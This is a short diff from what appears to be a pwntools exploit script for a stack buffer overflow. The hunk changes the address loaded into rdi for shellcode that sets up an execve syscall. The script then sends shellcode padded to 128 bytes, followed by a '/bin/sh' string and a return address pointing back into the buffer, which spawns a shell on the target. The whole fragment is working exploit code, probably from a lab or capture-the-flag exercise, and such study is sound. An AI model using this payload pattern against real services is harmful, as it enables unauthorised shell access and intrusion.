@@ -17,7 +17,7 @@ mov rdi, {}
 xor rsi, rsi
 xor rdx, rdx
 syscall
-""".format(buffer_address + 128))
+""".format(string_address))
 
 #          BUFFER                       STACK PAD   RETURN ADDR
 p.sendline(shellcode.ljust(128, 'A') + '/bin/sh\0' + p64(buffer_address));
